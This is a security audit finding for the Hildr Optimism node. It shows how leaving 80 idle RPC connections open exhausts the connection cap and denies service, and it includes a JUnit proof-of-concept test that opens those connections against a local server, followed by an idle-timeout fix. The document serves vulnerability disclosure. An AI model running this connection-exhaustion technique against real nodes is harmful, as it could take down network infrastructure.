# Lack of Idle connection handling may DoS the entire consensus layer

## Description
In `RpcServer.java`, [there is a `connectionHandler`](https://github.com/optimism-java/hildr/blob/280b82c27cffc323570a5586f848b3bf0a25a08b/src/main/java/io/optimism/rpc/RpcServer.java#L110-L132) to manage connections made from clients to the Hildr node. [It checks to ensure](https://github.com/optimism-java/hildr/blob/280b82c27cffc323570a5586f848b3bf0a25a08b/src/main/java/io/optimism/rpc/RpcServer.java#L112-L118) the number of active connections does not exceed the `maxActiveConnections` limit. The default value for `maxActiveConnections` is set to 80:
```java
    private static final int DEFAULT_MAX_ACTIVE_CONNECTIONS = 80;
```

If the number of connections to Hildr reaches this cap, the `connectionHandler` will prevent new connections from opening, effectively making the node unresponsive.
```java
            if (activeConnectionsCount.get() >= maxActiveConnections) {
                // disallow new connections to prevent DoS
                logger.warn(
                        "Rejecting new connection from {}. Max {} active connections limit reached.",
                        connection.remoteAddress(),
                        activeConnectionsCount.getAndIncrement());
                connection.close();
```

Since there is no mechanism to handle idle connections made to Hildr, if clients do not close their connections, they remain open indefinitely. This results in `activeConnectionsCount` eventually reaching or exceeding `maxActiveConnections`, effectively DoSing the node.

This vulnerability can be exploited in two ways:
1. A client implementation error that leaves connections open even after the client is done.
2. An attacker opening connections and leaving them open:
    - The attacker can simply open normal connections and leave them open until the cap is reached. With the default cap, only 80 connections are needed to exhaust the limit and DoS the node.

If an attacker performs this attack on all Hildr nodes, it could lead to a DoS across the entire consensus layer of Optimism.

## Proof of Concept
To run the proof of concept (PoC), make the following changes to `RpcServerTest.java`.

1. Add these imports to the file:
```diff
+ import static org.junit.jupiter.api.Assertions.assertTrue;
+ import java.util.concurrent.CompletableFuture;
+ import java.util.concurrent.TimeUnit;
+ import okhttp3.Call;
+ import okhttp3.Callback;
```

2. Add the following test case to the file:
```java
    @Test
    void testNinjaDoSRpcServer() throws Exception {
        RpcServer rpcServer = createRpcServer(new Config(
                null,
                null,
                "http://fakeurl", 
                "http://fakeurl",
                "http://fakeurl",
                null,
                null,
                null,
                "0.0.0.0",
                9545, 
                null,
                null,
                false,
                false,
                Config.SyncMode.Full,
                Config.ChainConfig.optimism()
        ));
        
        rpcServer.start();
    
        try {
            var openHttpClients = new ArrayList<OkHttpClient>();
    
            // opening HTTP connections up to the limit which is 80 and keeping them open indefinitely
            for (int i = 0; i < 80; i++) {
                OkHttpClient client = new OkHttpClient.Builder()
                        .readTimeout(0, TimeUnit.MILLISECONDS)  // No read timeout, keeps connections open
                        .build();
    
                Request request = new Request.Builder()
                        .url("http://127.0.0.1:9545")
                        .build();
    
                client.newCall(request).enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        e.printStackTrace();
                    }
    
                    @Override
                    public void onResponse(Call call, Response response) {
                        // keep response open to simulate idle connection
                    }
                });
    
                openHttpClients.add(client);  // keep client reference to prevent connection closure
            }
    
            // wait for connections to settle
            Thread.sleep(2000);
    
            // attempt an extra connection beyond the max limit
            OkHttpClient extraClient = new OkHttpClient();
            Request extraRequest = new Request.Builder()
                    .url("http://127.0.0.1:9545")
                    .build();
    
            CompletableFuture<Boolean> extraConnectionRejected = new CompletableFuture<>();
            extraClient.newCall(extraRequest).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    extraConnectionRejected.complete(true);  // expected failure
                }
    
                @Override
                public void onResponse(Call call, Response response) {
                    extraConnectionRejected.complete(false);  // limit not enforced if response opens
                }
            });
    
            // Node rejects new connections
            assertTrue(extraConnectionRejected.get(), "Expected server to reject connection due to max active connections limit.");
    
        } finally {
            rpcServer.stop();
        }
    }
```

3. Run the test:
```bash
./gradlew test --tests "io.optimism.rpc.RpcServerTest.testNinjaDoSRpcServer"
```

## Recommendation
Use [Vert.x's `setIdleTimeout`](https://vertx.io/docs/apidocs/io/vertx/ext/web/client/WebClientOptions.html#setIdleTimeout-int-) to handle idle connections.
